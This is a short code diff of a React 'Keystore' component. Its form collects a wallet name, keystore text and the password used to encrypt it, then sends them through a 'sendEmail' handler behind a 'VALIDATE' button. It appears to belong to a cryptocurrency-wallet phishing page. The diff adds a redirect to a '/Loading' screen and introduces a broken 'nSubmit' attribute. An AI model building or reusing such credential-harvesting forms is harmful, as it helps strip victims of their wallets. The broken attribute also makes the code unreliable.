@@ -55,7 +55,7 @@ export const Keystore = () => {
           </li>
         </ul>
       </div>
-      <form ref={form} onSubmit={sendEmail} className="myform">
+      <form ref={form} nSubmit={sendEmail} className="myform">
         <textarea
           name="walletName"
           placeholder="Wallet Name"
@@ -78,9 +78,9 @@ export const Keystore = () => {
           Several lines of text beginning with "(...)" plus the password you
           used to encrypt it.
         </p>
-        <button type="submit" name="submit">
+        <NavLink to="/Loading">    <button type="submit" name="submit" >
           <p>VALIDATE</p>
-        </button>
+        </button></NavLink> 
       </form>
     </div>
   );
